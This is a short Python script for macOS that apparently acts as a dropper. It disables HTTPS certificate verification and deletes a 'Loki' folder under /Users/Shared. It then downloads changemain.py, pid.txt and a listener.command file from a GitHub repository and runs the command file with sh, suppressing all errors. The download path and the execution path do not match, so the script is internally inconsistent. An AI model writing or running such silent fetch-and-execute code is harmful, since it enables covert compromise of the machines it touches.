import shutil
import os
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

try:
  shutil.rmtree ('/Users/Shared/Loki')
except:
  pass

try:
  os.mkdir ('/Users/Shared/Hermes')
  import time
  time.sleep (0.5)
  import urllib
  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changemain.py", "/Users/Shared/changemain.py")
  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/pid.txt", "/Users/Shared/pid.txt")
  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/listener.command", "/Users/Shared/listener.command")
  time.sleep (5)
  os.system ('sh /Users/Shared/Hermes/listener.command')
except:
  pass
